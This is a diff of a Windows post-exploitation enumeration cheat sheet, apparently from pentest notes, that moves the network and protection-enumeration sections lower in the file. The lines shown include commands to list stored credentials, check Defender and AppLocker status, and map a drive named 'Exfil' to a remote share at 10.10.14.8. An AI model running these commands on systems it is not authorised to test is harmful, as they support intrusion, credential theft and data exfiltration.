@@ -1,17 +1,5 @@
 # Windows Enumeration
 
-## Gather Network Information
-
-	ipconfig /all
-	arp -a
-	route print
-
-## Enumerate Protections
-
-	Get-MpComputerStatus
-	Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-	Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone 		Tests Applocker policy
-
 ## Basic System Information
 
 	echo %USERNAME%		Print current user
@@ -78,6 +66,19 @@
 			New-PSDrive -Name Exfil -PSProvider -FileSystem -Root "\\10.10.14.8\share"
 
 	cmdkey /list	Lists stored credentials
+
+## Gather Network Information
+
+	ipconfig /all
+	arp -a
+	route print
+
+## Enumerate Protections
+
+	Get-MpComputerStatus
+	Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+	Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone 		Tests Applocker policy
+
 
 ## System info
 
